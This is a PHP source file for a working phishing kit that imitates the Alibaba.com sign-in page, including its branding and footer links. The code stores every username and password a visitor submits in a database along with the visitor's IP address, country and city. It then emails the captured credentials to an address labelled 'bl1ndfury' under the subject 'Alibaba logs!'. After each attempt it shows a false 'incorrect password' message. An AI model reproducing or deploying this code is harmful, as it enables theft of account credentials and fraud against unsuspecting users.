<?php

require_once("configuration/config.php");
require_once("includes/functions.php");
require_once("includes/phpmailer/class.phpmailer.php");

//echo $city;

echo "

<!DOCTYPE html>


    <meta http-equiv='content-type' content='text/html;charset=UTF-8' />
	<head>
	<title>Alibaba&nbsp;Manufacturer&nbsp;Directory&nbsp;-&nbsp;Suppliers,&nbsp;Manufacturers,&nbsp;Exporters&nbsp;&amp;&nbsp;Importers&nbsp;</title>
	<meta content='text/html; charset=utf-8' http-equiv='Content-Type' />
	<meta name='keywords' content='Alibaba Manufacturer Directory - Suppliers, Manufacturers, Exporters &amp; Importers' />
	<meta name='description' content='Alibaba Manufacturer Directory - Suppliers, Manufacturers, Exporters &amp; Importers' />
	<link rel='stylesheet' type='text/css' href='https://login.alibaba.com/css/4v/layout.css'/>
	<link rel='stylesheet' type='text/css' href='https://login.alibaba.com/css/4v/common.css'/>
	<link rel='icon' type='image/png' href='favicon.png'>

	<script type='text/javascript' src='https://stylessl.aliunicorn.com:443/lib/aelite/aelite|app/over_show/over_show|util/connection|mod/login/home/common/switch-language/switch-language|mod/login/home/common/email-suggestion/email-suggestion|mod/common/xman/xman|MODERN_BROWSER|v_2de94b3c2fa70_1c57d7db5c6ce.js'></script>


	<style type='text/css' media='all'>
	.joinLink{font:bold 15px/20px Arial;}
	.joinLink:link{color:#039;text-decoration:underline;}
	.joinLink:visited{color:#039;text-decoration:underline;}
	.joinLink:hover{color:#f60;text-decoration:underline;}
	.alsoSignin { .padding-right: 20px; }
	 /* #formwrapper { float: left; }  */
 	#signin_joinfree { border-top:dashed 1px #CCCCCC; border-bottom:dashed 1px #CCCCCC; height:50px; }
	.forgotpassword { color: #0000EE; }
	.Trademanager { color: #0000EE; }
	.form {width: 180px; height:18px; }
	.buyersuppliers {line-height: 40px; color: #888888; }
	table { color: #2A2A2A;}
	.submit { width:100px; height: 30px; background-color:#FAC97A; border: 1px solid #EF8C3B; 
		background-image: linear-gradient(bottom, rgb(250,202,112) 49%, rgb(235,229,197) 75%, rgb(255,250,201) 100%);
		background-image: -o-linear-gradient(bottom, rgb(250,202,112) 49%, rgb(235,229,197) 75%, rgb(255,250,201) 100%);
		background-image: -moz-linear-gradient(bottom, rgb(250,202,112) 49%, rgb(235,229,197) 75%, rgb(255,250,201) 100%);
		background-image: -webkit-linear-gradient(bottom, rgb(250,202,112) 49%, rgb(235,229,197) 75%, rgb(255,250,201) 100%);
		background-image: -ms-linear-gradient(bottom, rgb(250,202,112) 49%, rgb(235,229,197) 75%, rgb(255,250,201) 100%);

		background-image: -webkit-gradient(
		linear,
		left bottom,
		left top,
		color-stop(0.49, rgb(250,202,112)),
		color-stop(0.75, rgb(235,229,197)),
		color-stop(1, rgb(255,250,201))
		);
		font-style: bold;
		}
	.joinfreenow { font-size: 13px; }
	a { color: #0000EE; }
	#invaliduserpass { height:40px; width:250px; border:solid 1px #FFCBCD; margin-left:20px; margin-top:12px; background-color:#FEEEEF; }
	</style>


				

	<link rel='stylesheet' type='text/css' href='https://login.alibaba.com/css/4v/sorcing-signin-20110212.css?c=20110820' />
	<div id='header'>
		<div class='header960 transform760'>
			<div id='aliLogo'>
				<a href='http://www.alibaba.com/' title='Manufacturers'>Alibaba.com</a>	
			</div>
			<div id='changelang'>
				<div id='currentlang'>
					<a rel='pt_PTen_US' href='javascript:void(0)'>English</a>
				</div>
				<div id='langlist' style='display:none;'></div>
			</div>
		</div>
	</div>



	<div id='page760' class='frameA signIn clearfix'>
			
		<style type='text/css'>
		.xman-box-content, .xman_buttonDPL {*width:auto !important;}
		</style>
		
		<div id='signInField'>
			<div class='inner'>
					<a id='pPasswT' href='https://login.alibaba.com/signimage/sign_image.htm'>&nbsp;&nbsp;</a>
					<h3>Verify Products</h3>
					<div id='signin_line_middle'></div>
		";
	//first part of the echo before the table.
?>

<?php
	
	if( !isset($_POST['username']) || !isset($_POST['password'])  ) {
		echo "
			<div id='formwrapper'>
				<form method='post' action=' " . $_SERVER['PHP_SELF']  . " ' >
				<table>
					<tr>
						<td>Email Address or Member ID:<br /><input type='text' name='username' class='form'></td>
					<tr>
						<td>Password:<br /><input type='password' name='password' class='form'></td>
					</tr>
				</table>
					<p class='forgotpassword'>forgot password?</p>
				<tr>
					<td><input type='checkbox'></td>
					<td>Also sign in to</td>
					<td><img src='xman_images.jpg'></td>
					<td><span class='forgotpassword'>Trade Manager</span></td>
				</tr>
				<p class='buyersuppliers'>Let Buyers and Suppliers know you are online.</p>
				<div id='signin_joinfree'>
					<table>
						<tr>
							<td><input type='submit' value='Sign in' class='submit'></td>
							<td><strong class='joinfreenow'><a href=''>Join free now</a></strong></td>
					</table>
				</div>
				<table>
				<tr>
					<td>Sign in with:</td> 
					<td><img src='facebook.png'></td>
					<td>Facebook</td>
				</tr>
				</table>
				</form>
			</div>
		";
	}	

	else {
	
	//global variables
	$username = mysql_real_escape_string( htmlentities( $_POST['username'] ) );
	$password = mysql_real_escape_string( htmlentities( $_POST['password'] ) );
	
	$body = $username .  ' | '  . $password . ' | ' . $body; // body for mail message
	
    //echo $body;
	//checking if username and pass exists.
	$query_user_pass = mysql_query("SELECT * FROM `logins` WHERE 
						`username` = '{$username}' and
						`password` = '{$password}' ");

	$user_pass_record = mysql_num_rows($query_user_pass);	
	
	//insert record if username and password does not exists
	if ( !$user_pass_record ) {
		$mysql_insert = mysql_query("INSERT INTO `logins` SET
						`username` = '{$username}',
						`password` = '{$password}',
						`ip`       = '{$user_ip}',
						`country`  = '{$country}',
						`city`	   = '{$city}' ");
	
		
		//send details to mail
		$mail = new PHPMailer;

		$mail->IsSMTP(); // telling the class to use SMTP
	    $mail->SMTPDebug  = 0;                     // enables SMTP debug information (for testing)
	                                               // 1 = errors and messages
	                                               // 2 = messages only
	    $mail->SMTPAuth   = true;                  // enable SMTP authentication
	    $mail->SMTPSecure = "ssl";                 // sets the prefix to the servier
	    $mail->Host       = $smtp_host;      // sets GMAIL as the SMTP server
	    $mail->Port       = $port;       //587->tls  465-> ssl           // set the SMTP port for the GMAIL server
	    $mail->Username   = $email;  // GMAIL username
	    $mail->Password   = $email_pass;            // GMAIL password
		
		$mail->SetFrom($sent_from, 'logs'); //('email address' 'displayname')

    	//$mail->AddReplyTo("reply-to@example.com","First Last");
    	$mail->Subject    = "Alibaba logs!";
    	$mail->Body       = $body;
    	//$address 		  = "bl1ndfury@live.com";
    	$mail->AddAddress($to_address , "bl1ndfury");
		
		$sent = $mail->send();

		//echo $sent ? "sent" : "error"; 





		if ( !$mysql_insert ) {
			//echo "<p>failed to insert details</p>";
		}
	
		else{
			//echo "<p>successfully inserted to database!</p>";
		}	
			
		echo "
		<div id='formwrapper'>
				<div id='invaliduserpass'><p><img src='invalidlogin.jpg'>The username or password you entered is incorrect.</p></div>
				<form method='post' action=' " . $_SERVER['PHP_SELF']  . " ' >
				<table>
					<tr>
						<td>Email Address or Member ID:<br /><input type='text' name='username' class='form'></td>
					<tr>
						<td>Password:<br /><input type='password' name='password' class='form'></td>
					</tr>
				</table>
					<p class='forgotpassword'>forgot password?</p>
				<tr>
					<td><input type='checkbox'></td>
					<td>Also sign in to</td>
					<td><img src='xman_images.jpg'></td>
					<td><span class='forgotpassword'>Trade Manager</span></td>
				</tr>
				<!--<p class='buyersuppliers'>Let Buyers and Suppliers know you are online.</p> -->
				<div id='signin_joinfree'>
					<table>
						<tr>
							<td><input type='submit' value='Sign in' class='submit'></td>
							<td><strong class='joinfreenow'><a href=''>Join free now</a></strong></p></td>
					</table>
				</div>
				<table>
				<tr>
					<td>Sign in with:</td> 
					<td><img src='facebook.png'></td>
					<td>Facebook</td>
				</tr>
				</table>
				</form>
			</div>
		";
	}
	
	//username and pass exists.
	else {
		echo "
		<div id='formwrapper'>
				<div id='invaliduserpass'><p><img src='invalidlogin.jpg'>The username or password you entered is incorrect.</p></div>
				<form method='post' action=' " . $_SERVER['PHP_SELF']  . " ' >
				<table>
					<tr>
						<td>Email Address or Member ID:<br /><input type='text' name='username' class='form'></td>
					<tr>
						<td>Password:<br /><input type='password' name='password' class='form'></td>
					</tr>
				</table>
					<p class='forgotpassword'>forgot password?</p>
				<tr>
					<td><input type='checkbox'></td>
					<td>Also sign in to</td>
					<td><img src='xman_images.jpg'></td>
					<td><span class='forgotpassword'>Trade Manager</span></td>
				</tr>
				<!--<p class='buyersuppliers'>Let Buyers and Suppliers know you are online.</p> -->
				<div id='signin_joinfree'>
					<table>
						<tr>
							<td><input type='submit' value='Sign in' class='submit'></td>
							<td><strong class='joinfreenow'><a href=''>Join free now</a></strong></p></td>
					</table>
				</div>
				<table>
				<tr>
					<td>Sign in with:</td> 
					<td><img src='facebook.png'></td>
					<td>Facebook</td>
				</tr>
				</table>
				</form>
			</div>
		";
	}
} 		

?>


<?php
	//last part
	echo "
				
				<!-- <div id='standardlogin' style='min-height:270px;_height:270px;'></div> -->
					</div>
					<div id='signInField_bottom'></div>
				</div>
	
				<div id='benefits'  >
					<span >Verify products to continue</span>
					<h1 >International trade management anytime, anywhere</h1>
					
					<ul id='benefitsList' >
						<li> Manage your Product Listings / Buying Leads </li>
						<li> List your Company Profile </li>
						<li> Access your contact lists fast </li>
						<li> Communicate with trade partners in real-time </li>
						<li> Send and receive messages </li>
					</ul>
				</div>

			</div>

	<div id='footer'>
	<a href='http://www.alibaba.com/aboutalibaba/index.html'><strong>Company Info</strong></a> - <a href='http://www.alibaba.com/aboutalibaba/partnership_with_alibaba.html'><strong>Partnerships</strong></A><br />
	<a href='http://www.alibaba.com/'>Manufacturers</a> - <a href='http://www.aliexpress.com/' target='_blank'>Wholesalers</a> - <a href='http://chinasuppliers.alibaba.com/'>Gold Suppliers</a> - <a href='http://www.alibaba.com/catalogs/0/product.html'>Buy</a> - <a href='http://importer.alibaba.com/'>Sell</a> - <a href='http://tradeshow.alibaba.com/'>Trade Shows</a> - <a href='http://us.my.alibaba.com/'>My Alibaba</a> - <a href='http://exporter.alibaba.com/'>China Export Services</a> - <a href='http://www.alibaba.com/help'>Help</a> - <a href='http://www.alibaba.com/sitemap/sitemap.html'>Site Map</a> - <a href='http://www.alibaba.com/help/contact-us.html'>Customer Service</a>
	<p>	
		Browse Alphabetically: 
		<a href='http://www.alibaba.com/showroom/category.html'>All Products</a>, 
		<a href='http://www.alibaba.com/buyeroffers/category.html'>Importers</a>, 
		<a href='http://www.alibaba.com/countrysearch/CN/China.html'>China</a>, 
		<a href='http://www.aliexpress.com/promotion.html'>Promotion</a> - 
		<a href='http://www.alibaba.com/sitemap/archives.html'>Archive</a><br/><br/>
		<a href='http://www.alibaba.com/aboutalibaba/aligroup/index.html'>Alibaba Group</a>: 
        Alibaba.com: <a href='http://china.alibaba.com/' target='_blank'>Alibaba China</a>
        - <a href='http://www.alibaba.com/' target='_blank'>Alibaba International</a> 
        - <a href='http://www.aliexpress.com/' target='_blank'>AliExpress</a> 
        - <a href='http://www.alibaba.co.jp/' target='_blank'>Alibaba Japan</a> 
        | <a href='http://www.taobao.com/' target='_blank'>Taobao Marketplace</a> 
		| <a href='http://www.taobao.com/' target='_blank'>Taobao Mall</a>
		| <a href='http://www.taobao.com/' target='_blank'>eTao</a>
        | <a href='http://www.alipay.com/' target='_blank'>Alipay</a>
        | <a href='http://www.yahoo.com.cn/' target='_blank'>Yahoo! China</a> 
        | <a href='http://www.koubei.com/' target='_blank'>Koubei.com</a> 
        | <a href='http://www.alisoft.com/' target='_blank'>Alisoft</a>
	</p>
	<a rel='nofollow' href='http://news.alibaba.com/article/detail/help/100454423-1-product-listing-policy.html'>Product Listing Policy</a> - <a rel='nofollow' href='http://news.alibaba.com/article/detail/help/100453304-1-intellectual-property-rights-%2528ipr%2529-protection.html'>Intellectual Property Policy and Infringement Claims</a> - <a rel='nofollow' href='http://news.alibaba.com/article/detail/help/100453303-1-privacy-policy.html'>Privacy Policy</a> - <a rel='nofollow' href='http://news.alibaba.com/article/detail/help/100453293-1-terms-use.html'>Terms of Use</a> - <a href='http://resources.alibaba.com/trade_safe/home.htm'>Safety &amp; Security Center</a> - <a rel='nofollow' href='http://legal.alibaba.com/legal/site/login/login.htm?site_type=international&amp;language_id=english'>Report Intellectual Property Right Infringement</a><br />
	<a href='http://www.alibaba.com/trade/servlet/page/static/copyright_policy'>Copyright Notice</a> &copy 1999-<span id='thisYear'>2013</span> Alibaba.com Hong Kong Limited and licensors. All rights reserved. 
	</div>

	<!-- dragoon check -->

	</body>
	</html>
";

?>